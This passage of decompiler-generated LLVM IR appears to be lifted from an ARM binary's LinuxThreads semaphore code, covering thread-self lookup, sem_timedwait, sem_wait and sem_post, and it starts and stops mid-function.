  store i32 -1, i32* %ip.global-to-local, align 4
  %v2_bda0 = inttoptr i32 %storemerge1 to i32*
  store i32 %storemerge, i32* %v2_bda0, align 4
  br label %dec_label_pc_bdb8

dec_label_pc_bda8:                                ; preds = %dec_label_pc_bd88
  %v2_bda8 = add i32 %tmp, 8
  %v3_bda8 = inttoptr i32 %v2_bda8 to i32*
  store i32 %arg3, i32* %v3_bda8, align 4
  %v2_bdac = add i32 %tmp, 12
  %v3_bdac = inttoptr i32 %v2_bdac to i32*
  store i32 0, i32* %v3_bdac, align 4
  store i32 0, i32* %arg1, align 4
  %v2_bdb4 = add i32 %tmp, 4
  %v3_bdb4 = inttoptr i32 %v2_bdb4 to i32*
  store i32 0, i32* %v3_bdb4, align 4
  br label %dec_label_pc_bdb8

dec_label_pc_bdb8:                                ; preds = %dec_label_pc_bda0, %dec_label_pc_bda8
  %v0_bdb8 = load i32, i32* %ip.global-to-local, align 4
  ret i32 %v0_bdb8

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_bdb8, { 1, 0 }
  uselistorder label %dec_label_pc_bda0, { 1, 0 }
}

define i32 @_thread_self() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_bdc4 = load i32, i32* @global_var_2be4c.179, align 4
  %v0_bdc8 = load i32, i32* @sp, align 4
  %v3_bdc8 = icmp ult i32 %v0_bdc8, %v2_bdc4
  %v1_bdcc = ptrtoint i32* %stack_var_0 to i32
  br i1 %v3_bdc8, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_bde8, %entry
  %merge = phi i32 [ ptrtoint (i32* @global_var_2b0c0 to i32), %entry ], [ ptrtoint (i32* @global_var_2b2a0.186 to i32), %dec_label_pc_bde8 ]
  ret i32 %merge

bb3:                                              ; preds = %entry
  %v2_bddc = load i32, i32* @global_var_2be50.182, align 4
  %v3_bde0 = icmp ult i32 %v0_bdc8, %v2_bddc
  br i1 %v3_bde0, label %bb4, label %dec_label_pc_bde8

dec_label_pc_bde8:                                ; preds = %bb3
  %v2_bdec = load i32, i32* @global_var_2be54.184, align 4
  %v3_bdf0 = icmp ult i32 %v0_bdc8, %v2_bdec
  br i1 %v3_bdf0, label %bb, label %bb4

bb4:                                              ; preds = %dec_label_pc_bde8, %bb3
  %v2_be00 = load i32, i32* @global_var_30238.188, align 4
  %v3_be04 = and i32 %v1_bdcc, -2097152
  %v4_be04 = xor i32 %v3_be04, -2097152
  %v2_be0c = icmp eq i32 %v2_be00, 0
  %v1_be10 = sub i32 -477, %v4_be04
  br i1 %v2_be0c, label %dec_label_pc_be1c, label %dec_label_pc_be18

dec_label_pc_be18:                                ; preds = %bb4
  %v1_be18 = call i32 @__pthread_find_self(i32 %v1_be10)
  br label %dec_label_pc_be1c

dec_label_pc_be1c:                                ; preds = %bb4, %dec_label_pc_be18
  %v0_be1c = phi i32 [ %v1_be10, %bb4 ], [ %v1_be18, %dec_label_pc_be18 ]
  %v1_be1c = add i32 %v0_be1c, -3
  ret i32 %v1_be1c

; uselistorder directives
  uselistorder i32 %v1_be10, { 1, 0 }
  uselistorder label %dec_label_pc_be1c, { 1, 0 }
}

define i32 @new_sem_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_be4c = call i32 @_thread_self()
  %v2_be5c = call i32 @__pthread_lock(i32 %arg1, i32 %v0_be4c)
  %v1_be64 = add i32 %arg1, 12
  store i32 %v1_be64, i32* @r0, align 4
  %v2_be68 = call i32 @remove_from_queue(i32 %v1_be64, i32 %arg2)
  %v1_be74 = call i32 @__pthread_unlock(i32 %arg1)
  ret i32 %v2_be68
}

define i32 @suspend(i32 %arg1) local_unnamed_addr {
entry:
  %v0_be84 = load i32, i32* @r0, align 4
  %v1_be84 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_be84)
  ret i32 %v1_be84
}

define i32 @sem_timedwait(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_be8c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  %v0_be98 = call i32 @_thread_self()
  %v0_bea4 = load i32, i32* @r6, align 4
  %v2_bea8 = call i32 @__pthread_lock(i32 %v0_bea4, i32 %v0_be98)
  %v0_beac = load i32, i32* @r6, align 4
  %v1_beac = add i32 %v0_beac, 8
  %v2_beac = inttoptr i32 %v1_beac to i32*
  %v3_beac = load i32, i32* %v2_beac, align 4
  %tmp14 = icmp slt i32 %v3_beac, 1
  br i1 %tmp14, label %dec_label_pc_becc, label %dec_label_pc_beb8

dec_label_pc_beb8:                                ; preds = %entry
  %v1_beb8 = add i32 %v3_beac, -1
  store i32 %v1_beb8, i32* %v2_beac, align 4
  %v0_bec0 = load i32, i32* @r6, align 4
  %v1_bec4 = call i32 @__pthread_unlock(i32 %v0_bec0)
  br label %dec_label_pc_c020

dec_label_pc_becc:                                ; preds = %entry
  %v0_becc = load i32, i32* @r8, align 4
  %v1_becc = add i32 %v0_becc, 4
  %v2_becc = inttoptr i32 %v1_becc to i32*
  %v3_becc = load i32, i32* %v2_becc, align 4
  store i32 %v3_becc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v3_becc, 1000000000
  br i1 %tmp, label %dec_label_pc_bef4, label %dec_label_pc_bedc

dec_label_pc_bedc:                                ; preds = %dec_label_pc_becc
  %v1_bee0 = call i32 @__pthread_unlock(i32 %v0_beac)
  %v0_bee4 = call i32 @__errno_location()
  br label %dec_label_pc_c018

dec_label_pc_bef4:                                ; preds = %dec_label_pc_becc
  store i32 %v0_beac, i32* %stack_var_-32, align 4
  %v0_bf04 = load i32, i32* @r5, align 4
  %v3_bf08 = add i32 %v0_bf04, 442
  %v4_bf08 = inttoptr i32 %v3_bf08 to i8*
  store i8 0, i8* %v4_bf08, align 1
  %v2_bf10 = call i32 @__pthread_set_own_extricate_if(i32 %v0_bf04, i32 %v2_be8c)
  %v0_bf14 = load i32, i32* @r5, align 4
  %v1_bf14 = add i32 %v0_bf14, 66
  %v2_bf14 = inttoptr i32 %v1_bf14 to i8*
  %v3_bf14 = load i8, i8* %v2_bf14, align 1
  %v2_bf18 = icmp eq i8 %v3_bf14, 0
  br i1 %v2_bf18, label %dec_label_pc_bf30, label %dec_label_pc_bf20

dec_label_pc_bf20:                                ; preds = %dec_label_pc_bef4
  %v1_bf20 = add i32 %v0_bf14, 64
  %v2_bf20 = inttoptr i32 %v1_bf20 to i8*
  %v3_bf20 = load i8, i8* %v2_bf20, align 1
  %v2_bf24 = icmp eq i8 %v3_bf20, 0
  br i1 %v2_bf24, label %dec_label_pc_bf40, label %dec_label_pc_bf30

dec_label_pc_bf30:                                ; preds = %dec_label_pc_bf20, %dec_label_pc_bef4
  %v0_bf30 = load i32, i32* @r6, align 4
  %v1_bf30 = add i32 %v0_bf30, 12
  %v2_bf38 = call i32 @enqueue(i32 %v1_bf30, i32 %v0_bf14)
  br label %dec_label_pc_bf40

dec_label_pc_bf40:                                ; preds = %dec_label_pc_bf20, %dec_label_pc_bf30
  %storemerge5 = phi i32 [ 0, %dec_label_pc_bf30 ], [ 1, %dec_label_pc_bf20 ]
  store i32 %storemerge5, i32* @r4, align 4
  %v0_bf40 = load i32, i32* @r6, align 4
  %v1_bf44 = call i32 @__pthread_unlock(i32 %v0_bf40)
  %v0_bf48 = load i32, i32* @r4, align 4
  %v2_bf48 = icmp eq i32 %v0_bf48, 0
  %v0_bf60.pre = load i32, i32* @r5, align 4
  br i1 %v2_bf48, label %dec_label_pc_bf60, label %dec_label_pc_bf50

dec_label_pc_bf50:                                ; preds = %dec_label_pc_bf40
  %v2_bf58 = call i32 @__pthread_set_own_extricate_if(i32 %v0_bf60.pre, i32 0)
  br label %dec_label_pc_bff4

dec_label_pc_bf60:                                ; preds = %dec_label_pc_bfc0, %dec_label_pc_bfb4, %dec_label_pc_bf40
  %v0_bf60 = phi i32 [ %v0_bf60.pre, %dec_label_pc_bf40 ], [ %v0_bfa8, %dec_label_pc_bfb4 ], [ %v0_bfa8, %dec_label_pc_bfc0 ]
  %v0_bf64 = load i32, i32* @r8, align 4
  %v2_bf68 = inttoptr i32 %v0_bf64 to i32*
  %v3_bf68 = call i32 @__pthread_timedsuspend_new(i32 %v0_bf60, i32* %v2_bf68)
  store i32 %v3_bf68, i32* @r7, align 4
  %v2_bf6c = icmp eq i32 %v3_bf68, 0
  br i1 %v2_bf6c, label %dec_label_pc_bf74, label %dec_label_pc_bfa8

dec_label_pc_bf74:                                ; preds = %dec_label_pc_bf60
  %v0_bf74 = load i32, i32* @r6, align 4
  %v0_bf78 = load i32, i32* @r5, align 4
  %v2_bf7c = call i32 @__pthread_lock(i32 %v0_bf74, i32 %v0_bf78)
  %v0_bf80 = load i32, i32* @r5, align 4
  %v0_bf84 = load i32, i32* @r6, align 4
  %v1_bf84 = add i32 %v0_bf84, 12
  store i32 %v1_bf84, i32* @r0, align 4
  %v2_bf88 = call i32 @remove_from_queue(i32 %v1_bf84, i32 %v0_bf80)
  store i32 %v2_bf88, i32* @r4, align 4
  %v0_bf90 = load i32, i32* @r6, align 4
  %v1_bf94 = call i32 @__pthread_unlock(i32 %v0_bf90)
  %v0_bf98 = load i32, i32* @r4, align 4
  %v2_bf98 = icmp eq i32 %v0_bf98, 0
  br i1 %v2_bf98, label %dec_label_pc_bfa0, label %dec_label_pc_c000

dec_label_pc_bfa0:                                ; preds = %dec_label_pc_bf74
  %v0_bfa0 = load i32, i32* @r5, align 4
  store i32 %v0_bfa0, i32* @r0, align 4
  %v1_bfa4 = call i32 @suspend(i32 %v0_bfa0)
  br label %dec_label_pc_bfa8

dec_label_pc_bfa8:                                ; preds = %dec_label_pc_bf60, %dec_label_pc_bfa0
  %v0_bfa8 = load i32, i32* @r5, align 4
  %v1_bfa8 = add i32 %v0_bfa8, 442
  %v2_bfa8 = inttoptr i32 %v1_bfa8 to i8*
  %v3_bfa8 = load i8, i8* %v2_bfa8, align 1
  %v2_bfac = icmp eq i8 %v3_bfa8, 0
  br i1 %v2_bfac, label %dec_label_pc_bfb4, label %dec_label_pc_bfcc

dec_label_pc_bfb4:                                ; preds = %dec_label_pc_bfa8
  %v1_bfb4 = add i32 %v0_bfa8, 440
  %v2_bfb4 = inttoptr i32 %v1_bfb4 to i8*
  %v3_bfb4 = load i8, i8* %v2_bfb4, align 1
  %v2_bfb8 = icmp eq i8 %v3_bfb4, 0
  br i1 %v2_bfb8, label %dec_label_pc_bf60, label %dec_label_pc_bfc0

dec_label_pc_bfc0:                                ; preds = %dec_label_pc_bfb4
  %v1_bfc0 = add i32 %v0_bfa8, 64
  %v2_bfc0 = inttoptr i32 %v1_bfc0 to i8*
  %v3_bfc0 = load i8, i8* %v2_bfc0, align 1
  %v2_bfc4 = icmp eq i8 %v3_bfc0, 0
  br i1 %v2_bfc4, label %dec_label_pc_bfcc, label %dec_label_pc_bf60

dec_label_pc_bfcc:                                ; preds = %dec_label_pc_bfc0, %dec_label_pc_bfa8
  %v2_bfd4 = call i32 @__pthread_set_own_extricate_if(i32 %v0_bfa8, i32 0)
  %v0_bfd8 = load i32, i32* @r5, align 4
  %v1_bfd8 = add i32 %v0_bfd8, 440
  %v2_bfd8 = inttoptr i32 %v1_bfd8 to i8*
  %v3_bfd8 = load i8, i8* %v2_bfd8, align 1
  %v2_bfdc = icmp eq i8 %v3_bfd8, 0
  br i1 %v2_bfdc, label %dec_label_pc_c020, label %dec_label_pc_bfe4

dec_label_pc_bfe4:                                ; preds = %dec_label_pc_bfcc
  %v1_bfe4 = add i32 %v0_bfd8, 64
  %v2_bfe4 = inttoptr i32 %v1_bfe4 to i8*
  %v3_bfe4 = load i8, i8* %v2_bfe4, align 1
  %v2_bfe8 = icmp eq i8 %v3_bfe4, 0
  br i1 %v2_bfe8, label %dec_label_pc_bff0, label %dec_label_pc_c020

dec_label_pc_bff0:                                ; preds = %dec_label_pc_bfe4
  store i8 0, i8* %v2_bfd8, align 1
  br label %dec_label_pc_bff4

dec_label_pc_bff4:                                ; preds = %dec_label_pc_bf50, %dec_label_pc_bff0
  %v2_bffc = call i32 @__pthread_do_exit(i32 -1, i32 %v2_be8c)
  br label %dec_label_pc_c000

dec_label_pc_c000:                                ; preds = %dec_label_pc_bf74, %dec_label_pc_bff4
  %v0_c000 = load i32, i32* @r5, align 4
  %v0_c004 = load i32, i32* @r7, align 4
  %v2_c008 = call i32 @__pthread_set_own_extricate_if(i32 %v0_c000, i32 %v0_c004)
  %v0_c00c = call i32 @__errno_location()
  br label %dec_label_pc_c018

dec_label_pc_c018:                                ; preds = %dec_label_pc_bedc, %dec_label_pc_c000
  %storemerge1 = phi i32 [ %v0_bee4, %dec_label_pc_bedc ], [ %v0_c00c, %dec_label_pc_c000 ]
  %storemerge = phi i32 [ 22, %dec_label_pc_bedc ], [ 110, %dec_label_pc_c000 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_c018 = inttoptr i32 %storemerge1 to i32*
  store i32 %storemerge, i32* %v2_c018, align 4
  %v0_c024.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c024

dec_label_pc_c020:                                ; preds = %dec_label_pc_bfe4, %dec_label_pc_bfcc, %dec_label_pc_beb8
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c024

dec_label_pc_c024:                                ; preds = %dec_label_pc_c018, %dec_label_pc_c020
  %v0_c024 = phi i32 [ %v0_c024.pre, %dec_label_pc_c018 ], [ 0, %dec_label_pc_c020 ]
  ret i32 %v0_c024

; uselistorder directives
  uselistorder i32 %v0_bfa8, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_c024, { 1, 0 }
  uselistorder label %dec_label_pc_c018, { 1, 0 }
  uselistorder label %dec_label_pc_c000, { 1, 0 }
  uselistorder label %dec_label_pc_bff4, { 1, 0 }
  uselistorder label %dec_label_pc_bfa8, { 1, 0 }
  uselistorder label %dec_label_pc_bf40, { 1, 0 }
}

define i32 @"$d.16"(i32 %arg1) local_unnamed_addr {
dec_label_pc_c030:
  %v0_c030 = load i1, i1* @cpsr_c, align 1
  %v1_c030 = xor i1 %v0_c030, true
  call void @__pseudo_cond_branch(i1 %v1_c030, i32 -26482636)
  %v0_c034 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c034, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_c030
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_c030, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__new_sem_wait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_c03c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %arg1, i32* @r4, align 4
  %v0_c044 = call i32 @_thread_self()
  %v0_c054 = load i32, i32* @r4, align 4
  store i32 %v0_c054, i32* %stack_var_-24, align 4
  %v2_c060 = call i32 @__pthread_lock(i32 %v0_c054, i32 %v0_c044)
  %v0_c064 = load i32, i32* @r4, align 4
  %v1_c064 = add i32 %v0_c064, 8
  %v2_c064 = inttoptr i32 %v1_c064 to i32*
  %v3_c064 = load i32, i32* %v2_c064, align 4
  %tmp12 = icmp slt i32 %v3_c064, 1
  br i1 %tmp12, label %dec_label_pc_c084, label %dec_label_pc_c070

dec_label_pc_c070:                                ; preds = %entry
  %v1_c070 = add i32 %v3_c064, -1
  store i32 %v1_c070, i32* %v2_c064, align 4
  %v0_c078 = load i32, i32* @r4, align 4
  %v1_c07c = call i32 @__pthread_unlock(i32 %v0_c078)
  br label %dec_label_pc_c168

dec_label_pc_c084:                                ; preds = %entry
  %v3_c08c = add i32 %v0_c044, 442
  %v4_c08c = inttoptr i32 %v3_c08c to i8*
  store i8 0, i8* %v4_c08c, align 1
  %v2_c098 = call i32 @__pthread_set_own_extricate_if(i32 %v0_c044, i32 %v2_c03c)
  %v1_c0a0 = add i32 %v0_c044, 66
  %v2_c0a0 = inttoptr i32 %v1_c0a0 to i8*
  %v3_c0a0 = load i8, i8* %v2_c0a0, align 1
  %v2_c0a4 = icmp eq i8 %v3_c0a0, 0
  br i1 %v2_c0a4, label %dec_label_pc_c0c0, label %dec_label_pc_c0ac

dec_label_pc_c0ac:                                ; preds = %dec_label_pc_c084
  %v1_c0b0 = add i32 %v0_c044, 64
  %v2_c0b0 = inttoptr i32 %v1_c0b0 to i8*
  %v3_c0b0 = load i8, i8* %v2_c0b0, align 1
  %v2_c0b4 = icmp eq i8 %v3_c0b0, 0
  br i1 %v2_c0b4, label %dec_label_pc_c0d0, label %dec_label_pc_c0c0

dec_label_pc_c0c0:                                ; preds = %dec_label_pc_c0ac, %dec_label_pc_c084
  %v0_c0c4 = load i32, i32* @r4, align 4
  %v1_c0c4 = add i32 %v0_c0c4, 12
  %v2_c0c8 = call i32 @enqueue(i32 %v1_c0c4, i32 %v0_c044)
  br label %dec_label_pc_c0d0

dec_label_pc_c0d0:                                ; preds = %dec_label_pc_c0ac, %dec_label_pc_c0c0
  %storemerge = phi i32 [ 0, %dec_label_pc_c0c0 ], [ 1, %dec_label_pc_c0ac ]
  store i32 %storemerge, i32* @r5, align 4
  %v0_c0d0 = load i32, i32* @r4, align 4
  %v1_c0d4 = call i32 @__pthread_unlock(i32 %v0_c0d0)
  %v0_c0d8 = load i32, i32* @r5, align 4
  %v2_c0d8 = icmp eq i32 %v0_c0d8, 0
  store i32 %v0_c044, i32* @r0, align 4
  br i1 %v2_c0d8, label %dec_label_pc_c0f0.preheader, label %dec_label_pc_c0e0

dec_label_pc_c0f0.preheader:                      ; preds = %dec_label_pc_c0d0
  %v1_c0f41 = call i32 @suspend(i32 %v0_c044)
  %v3_c0fc2 = load i8, i8* %v4_c08c, align 1
  %v2_c1004 = icmp eq i8 %v3_c0fc2, 0
  %v1_c10c = add i32 %v0_c044, 440
  %v2_c10c = inttoptr i32 %v1_c10c to i8*
  br i1 %v2_c1004, label %dec_label_pc_c108.lr.ph, label %dec_label_pc_c128

dec_label_pc_c108.lr.ph:                          ; preds = %dec_label_pc_c0f0.preheader
  %v1_c11c = add i32 %v0_c044, 64
  %v2_c11c = inttoptr i32 %v1_c11c to i8*
  br label %dec_label_pc_c108

dec_label_pc_c0e0:                                ; preds = %dec_label_pc_c0d0
  %v2_c0e8 = call i32 @__pthread_set_own_extricate_if(i32 %v0_c044, i32 0)
  br label %dec_label_pc_c15c

dec_label_pc_c108:                                ; preds = %dec_label_pc_c108.lr.ph, %dec_label_pc_c0f0.backedge
  %v3_c10c = load i8, i8* %v2_c10c, align 1
  %v2_c110 = icmp eq i8 %v3_c10c, 0
  br i1 %v2_c110, label %dec_label_pc_c0f0.backedge, label %dec_label_pc_c118

dec_label_pc_c0f0.backedge:                       ; preds = %dec_label_pc_c108, %dec_label_pc_c118
  store i32 %v0_c044, i32* @r0, align 4
  %v1_c0f4 = call i32 @suspend(i32 %v0_c044)
  %v3_c0fc = load i8, i8* %v4_c08c, align 1
  %v2_c100 = icmp eq i8 %v3_c0fc, 0
  br i1 %v2_c100, label %dec_label_pc_c108, label %dec_label_pc_c128

dec_label_pc_c118:                                ; preds = %dec_label_pc_c108
  %v3_c11c = load i8, i8* %v2_c11c, align 1
  %v2_c120 = icmp eq i8 %v3_c11c, 0
  br i1 %v2_c120, label %dec_label_pc_c128, label %dec_label_pc_c0f0.backedge

dec_label_pc_c128:                                ; preds = %dec_label_pc_c0f0.backedge, %dec_label_pc_c118, %dec_label_pc_c0f0.preheader
  %v2_c130 = call i32 @__pthread_set_own_extricate_if(i32 %v0_c044, i32 0)
  %v3_c138 = load i8, i8* %v2_c10c, align 1
  %v2_c13c = icmp eq i8 %v3_c138, 0
  br i1 %v2_c13c, label %dec_label_pc_c168, label %dec_label_pc_c144

dec_label_pc_c144:                                ; preds = %dec_label_pc_c128
  %v1_c148 = add i32 %v0_c044, 64
  %v2_c148 = inttoptr i32 %v1_c148 to i8*
  %v3_c148 = load i8, i8* %v2_c148, align 1
  %v2_c14c = icmp eq i8 %v3_c148, 0
  br i1 %v2_c14c, label %dec_label_pc_c154, label %dec_label_pc_c168

dec_label_pc_c154:                                ; preds = %dec_label_pc_c144
  store i8 0, i8* %v2_c10c, align 1
  br label %dec_label_pc_c15c

dec_label_pc_c15c:                                ; preds = %dec_label_pc_c0e0, %dec_label_pc_c154
  %v2_c164 = call i32 @__pthread_do_exit(i32 -1, i32 %v2_c03c)
  br label %dec_label_pc_c168

dec_label_pc_c168:                                ; preds = %dec_label_pc_c144, %dec_label_pc_c128, %dec_label_pc_c070, %dec_label_pc_c15c
  ret i32 0

; uselistorder directives
  uselistorder i8* %v4_c08c, { 1, 0, 2 }
  uselistorder i32 %v0_c044, { 4, 5, 9, 8, 3, 6, 7, 0, 1, 10, 2, 12, 11, 13, 14 }
  uselistorder i32 (i32)* @suspend, { 2, 0, 1 }
  uselistorder i32 (i32, i32)* @enqueue, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_c168, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_c15c, { 1, 0 }
  uselistorder label %dec_label_pc_c128, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c0f0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_c108, { 1, 0 }
  uselistorder label %dec_label_pc_c0d0, { 1, 0 }
}

define i32 @__new_sem_post(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %v3_c178 = load i32, i32* @r4, align 4
  %v9_c178 = load i32, i32* @r6, align 4
  %v2_c17c = ptrtoint i32* %stack_var_-164 to i32
  store i32 %arg1, i32* @r4, align 4
  %v0_c184 = call i32 @_thread_self()
  %v1_c188 = add i32 %v0_c184, 84
  %v2_c188 = inttoptr i32 %v1_c188 to i32*
  %v3_c188 = load i32, i32* %v2_c188, align 4
  store i32 %v3_c188, i32* @r6, align 4
  %v2_c18c = icmp eq i32 %v3_c188, 0
  br i1 %v2_c18c, label %dec_label_pc_c194, label %dec_label_pc_c218

dec_label_pc_c194:                                ; preds = %entry
  %v0_c198 = load i32, i32* @r4, align 4
  %v2_c19c = call i32 @__pthread_lock(i32 %v0_c198, i32 %v0_c184)
  %v0_c1a0 = load i32, i32* @r4, align 4
  %v1_c1a0 = add i32 %v0_c1a0, 12
  %v2_c1a0 = inttoptr i32 %v1_c1a0 to i32*
  %v3_c1a0 = load i32, i32* %v2_c1a0, align 4
  store i32 %v3_c1a0, i32* %r5.global-to-local, align 4
  %v2_c1a4 = icmp eq i32 %v3_c1a0, 0
  br i1 %v2_c1a4, label %dec_label_pc_c1ac, label %dec_label_pc_c1ec

dec_label_pc_c1ac:                                ; preds = %dec_label_pc_c194
  %v1_c1ac = add i32 %v0_c1a0, 8
  %v2_c1ac = inttoptr i32 %v1_c1ac to i32*
  %v3_c1ac = load i32, i32* %v2_c1ac, align 4
  %v4_c1b4 = icmp eq i32 %v3_c1ac, 2147483647
  br i1 %v4_c1b4, label %dec_label_pc_c1b8, label %dec_label_pc_c1d4

dec_label_pc_c1b8:                                ; preds = %dec_label_pc_c1ac
  %v0_c1b8 = call i32 @__errno_location()
  %v2_c1c0 = inttoptr i32 %v0_c1b8 to i32*
  store i32 34, i32* %v2_c1c0, align 4
  %v0_c1c4 = load i32, i32* @r4, align 4
  %v1_c1c8 = call i32 @__pthread_unlock(i32 %v0_c1c4)
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c280

dec_label_pc_c1d4:                                ; preds = %dec_label_pc_c1ac
  %v5_c1b0 = add i32 %v3_c1ac, 1
  store i32 %v5_c1b0, i32* %v2_c1ac, align 4
  %v0_c1dc = load i32, i32* @r4, align 4
  %v1_c1e0 = call i32 @__pthread_unlock(i32 %v0_c1dc)
  %v0_c1e4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_c1e4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c280

dec_label_pc_c1ec:                                ; preds = %dec_label_pc_c194
  %v1_c1ec = add i32 %v3_c1a0, 8
  %v2_c1ec = inttoptr i32 %v1_c1ec to i32*
  %v3_c1ec = load i32, i32* %v2_c1ec, align 4
  store i32 %v3_c1ec, i32* %v2_c1a0, align 4
  %v0_c1f8 = load i32, i32* @r6, align 4
  %v1_c1f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_c1f8 = add i32 %v1_c1f8, 8
  %v3_c1f8 = inttoptr i32 %v2_c1f8 to i32*
  store i32 %v0_c1f8, i32* %v3_c1f8, align 4
  %v1_c1fc = call i32 @__pthread_unlock(i32 %v0_c1a0)
  %v2_c204 = load i32, i32* %r5.global-to-local, align 4
  %v3_c204 = add i32 %v2_c204, 442
  %v4_c204 = inttoptr i32 %v3_c204 to i8*
  store i8 1, i8* %v4_c204, align 1
  %v0_c208 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_c208, i32* @r0, align 4
  %v0_c20c = call i32 @__pthread_restart_new()
  %v0_c210 = load i32, i32* @r6, align 4
  store i32 %v0_c210, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c280

dec_label_pc_c218:                                ; preds = %entry
  %v2_c21c = load i32, i32* @global_var_2b484.197, align 4
  %v1_c220 = icmp slt i32 %v2_c21c, 0
  br i1 %v1_c220, label %dec_label_pc_c228, label %dec_label_pc_c248

dec_label_pc_c228:                                ; preds = %dec_label_pc_c218
  %v0_c228 = call i32 @__pthread_initialize_manager()
  %v1_c22c = icmp slt i32 %v0_c228, 0
  br i1 %v1_c22c, label %dec_label_pc_c234, label %dec_label_pc_c248

dec_label_pc_c234:                                ; preds = %dec_label_pc_c228
  %v0_c234 = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_c240 = inttoptr i32 %v0_c234 to i32*
  store i32 11, i32* %v2_c240, align 4
  %v0_c280.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c280

dec_label_pc_c248:                                ; preds = %dec_label_pc_c228, %dec_label_pc_c218
  br label %dec_label_pc_c250

dec_label_pc_c250:                                ; preds = %dec_label_pc_c26c, %dec_label_pc_c248
  store i32 %v2_c17c, i32* @r1, align 4
  %v2_c258 = load i32, i32* @global_var_2b484.197, align 4
  store i32 %v2_c258, i32* @r0, align 4
  store i32 148, i32* @r2, align 4
  %v2_c260 = call i32 @__libc_write(i32 %v2_c258, i32 %v2_c17c)
  %v3_c264 = icmp eq i32 %v2_c260, -1
  br i1 %v3_c264, label %dec_label_pc_c26c, label %dec_label_pc_c27c

dec_label_pc_c26c:                                ; preds = %dec_label_pc_c250
  %v0_c26c = call i32 @__errno_location()
  %v1_c270 = inttoptr i32 %v0_c26c to i32*
  %v2_c270 = load i32, i32* %v1_c270, align 4
  %v7_c274 = icmp eq i32 %v2_c270, 4
  br i1 %v7_c274, label %dec_label_pc_c250, label %dec_label_pc_c27c

dec_label_pc_c27c:                                ; preds = %dec_label_pc_c250, %dec_label_pc_c26c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c280

dec_label_pc_c280:                                ; preds = %dec_label_pc_c234, %dec_label_pc_c1ec, %dec_label_pc_c1d4, %dec_label_pc_c1b8, %dec_label_pc_c27c
  %v0_c280 = phi i32 [ %v0_c280.pre, %dec_label_pc_c234 ], [ %v0_c210, %dec_label_pc_c1ec ], [ %v0_c1e4, %dec_label_pc_c1d4 ], [ -1, %dec_label_pc_c1b8 ], [ 0, %dec_label_pc_c27c ]
  store i32 %v3_c178, i32* @r4, align 4
  store i32 %v9_c178, i32* @r6, align 4
  ret i32 %v0_c280

; uselistorder directives
  uselistorder i32 %v3_c1ac, { 1, 0 }
  uselistorder i32 %v0_c1a0, { 1, 0, 2 }
  uselistorder i32 %v2_c17c, { 1, 0 }
  uselistorder i32 ()* @_thread_self, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_c280, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_c27c, { 1, 0 }
}

define i32 @pthread_null_sighandler() local_unnamed_addr {
entry:
  %v1_c290 = load i32, i32* @r0, align 4
  ret i32 %v1_c290
}

define i32 @_thread_self.1() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_c298 = load i32, i32* @global_var_2be4c.179, align 4
  %v0_c29c = load i32, i32* @sp, align 4
  %v3_c29c = icmp ult i32 %v0_c29c, %v2_c298
  %v1_c2a0 = ptrtoint i32* %stack_var_0 to i32
  br i1 %v3_c29c, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_c2bc, %entry
  %merge = phi i32 [ ptrtoint (i32* @global_var_2b0c0 to i32), %entry ], [ ptrtoint (i32* @global_var_2b2a0.186 to i32), %dec_label_pc_c2bc ]
  ret i32 %merge

bb3:                                              ; preds = %entry
  %v2_c2b0 = load i32, i32* @global_var_2be50.182, align 4
  %v3_c2b4 = icmp ult i32 %v0_c29c, %v2_c2b0
  br i1 %v3_c2b4, label %bb4, label %dec_label_pc_c2bc

dec_label_pc_c2bc:                                ; preds = %bb3
  %v2_c2c0 = load i32, i32* @global_var_2be54.184, align 4
  %v3_c2c4 = icmp ult i32 %v0_c29c, %v2_c2c0
  br i1 %v3_c2c4, label %bb, label %bb4

bb4:                                              ; preds = %dec_label_pc_c2bc, %bb3
